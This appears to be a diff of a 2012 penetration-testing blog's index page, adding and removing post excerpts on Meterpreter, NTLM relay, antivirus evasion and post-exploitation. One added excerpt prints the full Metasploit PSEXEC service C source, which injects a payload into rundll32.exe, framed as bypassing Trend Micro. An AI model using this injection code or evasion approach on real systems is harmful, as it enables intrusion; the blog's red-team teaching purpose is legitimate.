@@ -219,6 +219,146 @@
     
       <article>
   <header>
+    <h2><a href="//room362.com/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/">Raising Zombies in Windows: Part 1 - Passwords</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>31 Jul 2012, 20:20</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+  With the use of Mimikatz and WCE, clear text passwords are much more common. What isn&rsquo;t always there is the user. They take lunches, go home at a reasonable time and generally aren&rsquo;t really appreciative of our (pentester/red teamer)&rsquo;s schedule. A straight forward way, and provided by Microsoft to create a process as a user (whereby having their token readily available is using &lsquo;runas.exe&rsquo;: w00t, we the user is present, we can migrate our meterepreter session into that notepad and we&rsquo;re good right?
+  </p>
+
+  
+  <footer>
+    <a href="/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+  </footer>
+  
+</article>
+
+    
+  
+    
+      <article>
+  <header>
+    <h2><a href="//room362.com/post/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/">Cross-Protocol Chained Pass the Hash for Metasploit</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>10 Jul 2012, 06:02</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+  Every so often someone writes a Metasploit Module that is pretty epic. Today is one such day: Twitter Link: https://twitter.com/webstersprodigy/status/222529916783169536 Which has a link to here: https://github.com/rapid7/metasploit-framework/pull/589 Demo / Example resource files: https://skydrive.live.com/?cid=19794fac33285fd5&amp;resid=19794FAC33285FD5!170&amp;id=19794FAC33285FD5%21170 You can pull the fork w/ branch from here: https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay And as soon as you do you can start doing this (using the example resource file to put a file, cat it out, enum shares available, list files on a share, then psexec all from a single URL being loaded): 163 address is the Victim I tricked into loading a URL and 182 is the system I want to get onto.
+  </p>
+
+  
+  <footer>
+    <a href="/post/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+  </footer>
+  
+</article>
+
+    
+  
+    
+      <article>
+  <header>
+    <h2><a href="//room362.com/post/2012/2012-07-05-bypassing-trend-micros-service-protection/">Bypassing Trend Micro&#39;s Service Protection</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>05 Jul 2012, 03:44</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+  @jabjorkhaug posed the following question on Twitter today: I figured I could solve this and it would be an interesting challenge. Here is what it gets detected as: The service binary that is used as part of PSEXEC is located here: MSF Directory/data/templates/src/pe/exe/service/service.c The important part to look at starts at line 57: #define WIN32_LEAN_AND_MEAN #include &lt;windows.h&gt; #define PAYLOAD_SIZE 8192 char cServiceName[32] = &quot;SERVICENAME&quot;; char bPayload[PAYLOAD_SIZE] = &quot;PAYLOAD:&quot;; SERVICE_STATUS ss; SERVICE_STATUS_HANDLE hStatus = NULL; /* * */ BOOL ServiceHandler( DWORD dwControl ) { if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN ) { ss.dwWin32ExitCode = 0; ss.dwCurrentState = SERVICE_STOPPED; } return SetServiceStatus( hStatus, &amp;ss ); } /* * */ VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors ) { CONTEXT Context; STARTUPINFO si; PROCESS_INFORMATION pi; LPVOID lpPayload = NULL; ZeroMemory( &amp;ss, sizeof(SERVICE_STATUS) ); ZeroMemory( &amp;si, sizeof(STARTUPINFO) ); ZeroMemory( &amp;pi, sizeof(PROCESS_INFORMATION) ); si.cb = sizeof(STARTUPINFO); ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS; ss.dwCurrentState = SERVICE_START_PENDING; ss.dwControlsAccepted = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN; hStatus = RegisterServiceCtrlHandler( (LPCSTR)&amp;cServiceName, (LPHANDLER_FUNCTION)ServiceHandler ); if ( hStatus ) { ss.dwCurrentState = SERVICE_RUNNING; SetServiceStatus( hStatus, &amp;ss ); if( CreateProcess( NULL, &quot;rundll32.exe&quot;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi ) ) { Context.ContextFlags = CONTEXT_FULL; GetThreadContext( pi.hThread, &amp;Context ); lpPayload = VirtualAllocEx( pi.hProcess, NULL, PAYLOAD_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE ); if( lpPayload ) { WriteProcessMemory( pi.hProcess, lpPayload, &amp;bPayload, PAYLOAD_SIZE, NULL ); #ifdef _WIN64 Context.Rip = (DWORD64)lpPayload; #else Context.Eip = (DWORD)lpPayload; #endif SetThreadContext( pi.hThread, &amp;Context ); } ResumeThread( pi.hThread ); CloseHandle( pi.hThread ); CloseHandle( pi.hProcess ); } ServiceHandler( SERVICE_CONTROL_STOP ); ExitProcess( 0 ); } } /* * */ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow ) { SERVICE_TABLE_ENTRY st[] = { { (LPSTR)&amp;cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&amp;ServiceMain }, { NULL, NULL } }; return StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY *)&amp;st ); } It&rsquo;s injecting our payload into the service binary and tossing our payload into &ldquo;rundll32.exe&rdquo; at run time on the victim (side note: you can change which bin it goes into ;).
+  </p>
+
+  
+  <footer>
+    <a href="/post/2012/2012-07-05-bypassing-trend-micros-service-protection/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+  </footer>
+  
+</article>
+
+    
+  
+    
+      <article>
+  <header>
+    <h2><a href="//room362.com/post/2012/2012-06-29-presence-persistence-and-pivoting/">Presence, Persistence, and Pivoting</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>29 Jun 2012, 23:33</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+  Everyone does things differently, and explaining what goes through an attackers head when they get a shell is virtually impossible and even more so to generalize into a methodology, but I’ve tried to do that with the “3 ‘P’s of Post Exploitation” and they are in a certain order for a reason but certainly up to circumstance to what order is best. The first P is Presence. It is first because the attacker needs to get a sense of what he/she has got before they move on.
+  </p>
+
+  
+  <footer>
+    <a href="/post/2012/2012-06-29-presence-persistence-and-pivoting/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+  </footer>
+  
+</article>
+
+    
+  
+    
+      <article>
+  <header>
     <h2><a href="//room362.com/post/2012/2012-06-28-netstat-post-module-for-meterpreter/">Netstat Post Module for Meterpreter</a></h2>
 
     <div class="post-meta">
@@ -421,134 +561,6 @@
   <footer>
     <a href="/post/2012/2012-05-25-post-exploitation-with-phantomjs/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
   </footer>
-  
-</article>
-
-    
-  
-    
-      <article>
-  <header>
-    <h2><a href="//room362.com/post/2012/2012-05-24-sticky-keys-and-utilman-against-nla/">Sticky Keys and Utilman against NLA</a></h2>
-
-    <div class="post-meta">
-
-  <div>
-    <i class="fa fa-calendar fa-fw"></i>
-    <time>24 May 2012, 17:10</time>
-  </div>
-
-  
-
-  
-
-  
-
-</div>
-
-  </header>
-
-  <p>
-  At CCDC, Sticky Keys via RDP was a very successful re-entry point for the Red Team. You can read more about how this works here: http://carnal0wnage.attackresearch.com/2012/04/privilege-escalation-via-sticky-keys.html So if you can get physical access or SYSTEM/Admin access at some point and enable + reach RDP, you can very easily follow those instructions and gain a level of persistance without the need of a pesky password :-) However, this doesn&rsquo;t work so well with the advent of NLA or Network-Level-Authentication, which was enabled for Vista systems and beyond.
-  </p>
-
-  
-  <footer>
-    <a href="/post/2012/2012-05-24-sticky-keys-and-utilman-against-nla/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-  </footer>
-  
-</article>
-
-    
-  
-    
-      <article>
-  <header>
-    <h2><a href="//room362.com/post/2012/2012-05-22-derbycon-training-sep-27-28-2012/">DerbyCon Training (Sep 27-28 2012)</a></h2>
-
-    <div class="post-meta">
-
-  <div>
-    <i class="fa fa-calendar fa-fw"></i>
-    <time>22 May 2012, 19:44</time>
-  </div>
-
-  
-
-  
-
-  
-
-</div>
-
-  </header>
-
-  <p>
-  @egypt and I have teamed up this year to teach at DerbyCon at the end of September. Here is the very basic outline of the class and subject to change: (Sign up here: https://www.derbycon.com/training-courses/ ) THURSDAY Intro to the Framework The history of the Framework Ninja Demo Usage Recon Exploitation Pillaging Post modules Intro to Ruby Getting your environment set up Ruby Basics Strings, Arrays, and Methods oh my IRB, Pry - The No-Spoon Portion Navigating Documentation Module Writing Auxiliary Modules Exploit Modules Post Modules Railgun (Windows and ?Linux?) Meterpreter(s) The Dread Pirate Reporting LAB, LABs and more LABS FRIDAY CTF + open LAB time definitely open to requests for content, if you, as a student, would like a particular topic included.
-  </p>
-
-  
-</article>
-
-    
-  
-    
-      <article>
-  <header>
-    <h2><a href="//room362.com/post/2012/2012-04-26-phdays-in-moscow/">phDays in Moscow</a></h2>
-
-    <div class="post-meta">
-
-  <div>
-    <i class="fa fa-calendar fa-fw"></i>
-    <time>26 Apr 2012, 21:33</time>
-  </div>
-
-  
-
-  
-
-  
-
-</div>
-
-  </header>
-
-  <p>
-  A friend of mine is presenting at phDays in Moscow at the end of May. If you are in the area, or can be, I would highly recommend you attend, and in particularly his talk. His blog is here: http://blog.gentilkiwi.com/ And since a picture is worth a thousand words: You should really go check out what he is going to present&hellip; just sayin&rsquo;
-  </p>
-
-  
-</article>
-
-    
-  
-    
-      <article>
-  <header>
-    <h2><a href="//room362.com/post/2012/2012-03-19-how-to-win-ccdc-slides/">How to Win CCDC - Slides</a></h2>
-
-    <div class="post-meta">
-
-  <div>
-    <i class="fa fa-calendar fa-fw"></i>
-    <time>19 Mar 2012, 05:20</time>
-  </div>
-
-  
-
-  
-
-  
-
-</div>
-
-  </header>
-
-  <p>
-  Since this is a constantly updating slide deck I figured I&rsquo;d post it here so I didn&rsquo;t have to keep emailing it out. ;-) If you have comments or if something is wrong grammatically, technically or in any other way I&rsquo;d love input. Suggestions also welcome. Here is a link straight to the doc if you want to comment or add it to your google docs list: https://docs.google.com/presentation/d/1pPXLg3KqwSMLRCNRfows5QnVI2mLjSmll5vN2WHMFJg/edit
-  </p>
-
   
 </article>
 
